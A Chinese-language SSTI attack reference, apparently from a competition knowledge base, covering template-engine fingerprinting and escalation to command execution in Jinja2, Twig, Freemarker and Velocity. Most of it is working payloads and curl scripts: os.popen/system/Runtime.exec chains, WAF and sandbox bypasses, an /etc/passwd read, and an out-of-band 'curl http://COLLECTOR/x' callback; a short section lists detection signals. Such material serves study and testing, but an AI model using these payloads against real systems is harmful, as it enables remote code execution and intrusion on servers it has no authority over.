# 模板渲染路径：SSTI 判定、沙箱逃逸、从表达式到命令

> 被 `competition-template-render-path` 引用。SSTI 的核心不是"能不能注入 `{{7*7}}`"，
> 而是**渲染上下文里有哪些对象可达**，以及**沙箱挡在哪一层**。

## 一、五引擎的探测载荷（先判引擎，再打逃逸）

| 引擎 | 探测 | 命中响应 |
| --- | --- | --- |
| **Jinja2**（Python） | `{{7*7}}` | `49` |
| Jinja2 变体 | `{{7*'7'}}` | `7777777`（字符串重复，与 Twig 区分） |
| **Twig**（PHP） | `{{7*7}}` | `49` |
| Twig 变体 | `{{7*'7'}}` | `49`（PHP 会把 '7' 转数字） |
| **Freemarker**（Java） | `${7*7}` | `49` |
| **Velocity**（Java） | `#set($x=7*7)$x` | `49` |
| **Smarty**（PHP） | `{$smarty.version}` 或 `{7*7}` | 版本号 / `49` |
| **ERB**（Ruby） | `<%= 7*7 %>` | `49` |
| **Handlebars/Mustache** | `{{7*7}}` | `{{7*7}}`（不执行，仅变量） |
| **Thymeleaf**（Java） | `[[${7*7}]]` | `49` |
| **Razor**（.NET） | `@(7*7)` | `49` |

```bash
# 一次性打全部探测载荷
for p in '{{7*7}}' "{{7*'7'}}" '${7*7}' '#set($x=7*7)$x' '{7*7}' '<%= 7*7 %>' '[[${7*7}]]' '@(7*7)'; do
  printf '%-22s ' "$p"
  curl -s -G https://target/render --data-urlencode "name=$p" | grep -oE '49|7777777' | head -1
done
```

**判读**：

- `49` → 真的执行了（SSTI）
- 载荷原样回显 → 不执行（但可能是别的位置的模板）
- 空白/报错 → 可能是模板引擎报错（也是信号，看错误内容）

## 二、Jinja2：从表达式到 RCE

### 2.1 目标对象链

```
''.__class__                      -> <class 'str'>
''.__class__.__mro__              -> (str, object)
''.__class__.__mro__[1].__subclasses__()   -> 所有已加载的类
```

```bash
# 1) 确认能访问属性
{{ ''.__class__ }}
# 2) 列出 subclasses 找 os._wrap_close / subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 3) 找索引（人工看输出，找 <class 'os._wrap_close'> 的位置）
```

```bash
# 常见 payload（索引需按目标实际调整）
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```bash
# subclasses 索引法（最通用，索引要现场找）
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0] }}
# INDEX 对应 subprocess.Popen

# 不依赖索引：用 __builtins__
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

### 2.2 绕过黑名单（Jinja2 常见 WAF）

| 过滤 | 绕过 |
| --- | --- |
| `__` 被过滤 | `{{ ''['\x5f\x5fclass\x5f\x5f'] }}`；或用 `attr` 过滤器：`{{ ''|attr('__class__') }}` |
| `'` 被过滤 | `{{ request.args.x }}`（参数带值）；或 `{{ ()|attr("__class__") }}` |
| `.` 被过滤 | `{{ ''|attr('__class__')|attr('__mro__') }}` |
| `os` 被过滤 | `{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}` 然后取索引 |
| `{{` `}}` 被过滤 | 用 `{% %}` 语句块：`{% if 1 %}{{7*7}}{% endif %}`；或 `{% print(7*7) %}` |
| `popen` 被过滤 | `{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}` |
| 全部关键字被过滤 | `{% set x = lipsum.__globals__ %}{{ x['os'].popen('id').read() }}` |
| `_` 被过滤 | `{{ request|attr([request|attr('__class__'),...]) }}`（复杂）；或利用 `|join` 拼字符串 |

```bash
# 用 request.args 传参（绕过引号过滤）
curl -s -G https://target/render \
  --data-urlencode "name={{ (request.args.a)|attr(request.args.b)|attr(request.args.c) }}" \
  --data-urlencode "a=" --data-urlencode "b=__class__" --data-urlencode "c=__mro__"
```

### 2.3 沙箱（SandboxedEnvironment）的绕过史

Jinja2 的 `SandboxedEnvironment` 拦截 `__` 属性访问、`__subclasses__`、`__globals__` 等。

| 绕过 | 原理 | 适用版本 |
| --- | --- | --- |
| `{{ ''.__class__.__mro__[1].__subclasses__() }}` | 老版本 sandbox 未拦 `__mro__` | < 2.10 部分 |
| `{{ ({}|attr('__class__')) }}` | `attr` 过滤器路径与 `.__class__` 不同 | 视实现 |
| `{{ cycler.__init__.__globals__ }}` | sandbox 只拦 class 属性，不拦函数 `__globals__` | 常见 |
| `{{ '%s'|format(...) }}` | format 字符串的副作用（已修） | 老版 |
| `{{ ''.format.__globals__ }}` | 同上 | — |
| `{{ (lipsum|attr('__globals__'))['os'] }}` | 与 cycler 同类 | 常见 |

**关键判断**：`{{7*7}}` 生效但 `{{''.__class__}}` 报 `SecurityError` → **是 SandboxedEnvironment**，
需要走 `attr`/`globals` 路径，或找 sandbox 的漏拦方法。

## 三、Twig：从表达式到 RCE

```
{{7*7}}                       -> 49
{{7*'7'}}                     -> 49（与 Jinja2 的 7777777 区分）
{{_self}}                     -> 模板对象
```

```twig
{# 老版本 Twig（< 1.20 / < 2.0）可直接调 PHP 函数 #}
{{ system('id') }}
{{ phpinfo() }}
{{ file_excerpt('/etc/passwd') }}

{# 通过 _self 环境 #}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

{# Twig 2.x/3.x 的常见路径 #}
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
{{ app.request.server.all|join(',') }}          {# Symfony 特有，泄露 env #}
```

```bash
# Twig 探测（区分版本）
curl -s -G https://target/render --data-urlencode "name={{7*'7'}}"
# 49 → Twig；7777777 → Jinja2
```

**Twig 的现代限制**：3.x 默认禁用 `system`/`exec` 等函数，且 `SandboxExtension` 会拦属性访问。
常见绕过是找应用注册的自定义 filter/function。

## 四、Freemarker：从表达式到 RCE

```freemarker
${7*7}                                              -> 49
${"freemarker.template.utility.Execute"?new()("id")}  -> 执行（需 Execute 类可达）
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
```

```bash
# 精简版（很多 WAF 只过滤了 ?new()，可用 ?api 或 getClass 路径）
${7*7}
${"freemarker.template.utility.Execute"?new()("id")}
```

**Freemarker 的版本差异**：

| 版本 | 限制 |
| --- | --- |
| < 2.3.30 | `?new()` 可直接调 `Execute`/`ObjectConstructor` |
| ≥ 2.3.30 | `?new()` 被禁用（`new_builtin_class_resolver=allows_nothing`） |
| ≥ 2.3.31 | 需 `api_builtin_enabled=true` 才能用 `?api` |

绕过思路：找应用自定义的 `TemplateClassResolver`、或 `?api` 读 `getClass()`、或通过
`Environment.getCurrentEnvironment()` 拿对象。

## 五、Velocity：从表达式到 RCE

```velocity
#set($x=7*7)$x
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

```bash
# Velocity 探测
curl -s -G https://target/render --data-urlencode 'name=#set($x=7*7)$x'
```

**Velocity 的现代限制**：Solr/Velocity 有 `SecureUberspector`，会拦 `getClass()`。
绕过靠应用暴露的 context 对象。

## 六、渲染上下文的影响（这一节最容易被忽略）

**同一段模板，在不同上下文里可达的对象不同**。这决定了能不能 RCE：

| 上下文 | 可达对象 | 逃逸难度 |
| --- | --- | --- |
| 用户输入直接拼进模板字符串 | 完整引擎全局（`lipsum`/`cycler`/`config`） | 低 |
| 用户输入作为一个**变量值**（`render(tpl, name=user_input)`） | 只有内置对象 + 传入的变量 | 中（仍能走 `''.__class__`） |
| 模板在受限 context（无 `config`/`request`） | 只有内置 | 中高 |
| Sandbox 环境 | 白名单属性 | 高 |
| 前端模板（Handlebars/JS） | 仅 JS 对象 | 不同类（原型污染） |

```bash
# 判断上下文：试不同的全局对象
for p in '{{config}}' '{{request}}' '{{self}}' '{{lipsum}}' '{{cycler}}' '{{namespace}}'; do
  printf '%-14s ' "$p"
  curl -s -G https://target/render --data-urlencode "name=$p" | head -c 80; echo
done
```

**能回显 `config`/`request` 的 repr → 上下文完整 → RCE 概率高。**

## 七、从 SSTI 到命令执行的完整验证

```bash
# 阶段 1：确认执行
curl -s -G https://target/render --data-urlencode 'name={{7*7}}'
# 期望 49

# 阶段 2：确认对象可达
curl -s -G https://target/render --data-urlencode "name={{''.__class__.__mro__[1].__subclasses__()}}" | head -c 300

# 阶段 3：执行无害命令（避免破坏性）
curl -s -G https://target/render --data-urlencode "name={{lipsum.__globals__.os.popen('id').read()}}"
# 期望 uid=... gid=...

# 阶段 4：确认身份与文件系统
curl -s -G https://target/render --data-urlencode "name={{lipsum.__globals__.os.popen('whoami; hostname; pwd').read()}}"
```

**必须用 `popen(...).read()` 拿回显**。若没有回显（blind SSTI），用时间或 OOB：

```bash
# 时间盲（Jinja2）
curl -s -o /dev/null -w '%{time_total}\n' -G https://target/render \
  --data-urlencode "name={{lipsum.__globals__.os.popen('sleep 5').read()}}"
# >5s → 确认执行

# OOB（DNS/HTTP）
curl -s -G https://target/render \
  --data-urlencode "name={{lipsum.__globals__.os.popen('curl http://COLLECTOR/x').read()}}"
```

## 八、验伤：SSTI 的"成功"判据

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| SSTI 存在 | `{{7*7}}` 返回 **49**（数字，非回显） | 返回 `{{7*7}}`（不执行）；返回 `49` 但是在别的位置（前端算的） |
| 引擎是 Jinja2 | `{{7*'7'}}` 返回 `7777777` | 只看了 `{{7*7}}` |
| 沙箱可逃逸 | 拿到 `os.popen('id')` 的**真实输出** | 能访问 `__class__` 但 `__globals__` 被拦 |
| 命令执行 | `id`/`whoami` 的真实输出（含用户名/主机名） | 返回了错误信息（说明尝试了但失败） |
| 上下文受限 | — | — |

**必须排除的假象**：

1. **前端也算 `{{7*7}}`**：有些前端模板（Vue/Angular）也支持插值。看响应是服务端渲染还是客户端。
2. **回显是缓存的**：上一轮的结果被 CDN 缓存。加随机参数 `?x=$(date +%s)`。
3. **`49` 是巧合**：输入里本来就有 49。用 `{{7*191}}`（=1337）这种独特值。
4. **错误页里有 "49"**：堆栈里的行号恰好是 49。看上下文。

```bash
# 用独特值排除巧合
curl -s -G https://target/render --data-urlencode 'name={{1234*5678}}'
# 期望 7006652
```

## 九、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| SSTI 探测 | WAF/应用日志 | 请求参数含 `{{`、`${`、`#set`、`<%=` |
| 属性链探测 | 应用日志 | 参数含 `__class__`、`__mro__`、`__subclasses__`、`__globals__` |
| 命令执行 | EDR/进程 | 模板进程（python/java/php）拉起 `sh`/`cmd`/`curl`/`id` |
| 出网 | 网络 | 应用服务器向外部发起 HTTP/DNS（OOB 探测） |
| 时间侧信道 | 应用 | 单请求耗时异常（sleep） |
| 错误页泄露 | 应用 | 模板错误包含文件路径、可用对象 |

## 十、常见坑

1. **只试 `{{7*7}}`**——Handlebars/Mustache 不执行它，会原样回显，容易误判"无 SSTI"。要全套载荷都试。
2. **`{{7*'7'}}` 分不清 Jinja2 与 Twig**——Jinja2 是 `7777777`，Twig 是 `49`。这是最可靠的分辨方法。
3. **`__subclasses__()` 索引写死**——不同环境的索引完全不同。必须现场列出来找。
4. **没有回显就放弃**——blind SSTI 用 `sleep`/`curl` OOB 验证，一样能证明。
5. **忽略了缓存**——CDN 缓存了上一轮响应，看起来 payload 生效了其实是旧结果。加随机参数。
6. **在 sandbox 环境用非 sandbox payload**——报 `SecurityError` 说明有 sandbox，要换 `attr`/`globals` 路径。
7. **Freemarker 的 `?new()` 在新版被禁**——`< 2.3.30` 才能直接用 `Execute`。先判版本。
8. **忘了检查模板在哪个参数**——同一个页面可能有 5 个参数进模板，只有一个有 SSTI。逐个试。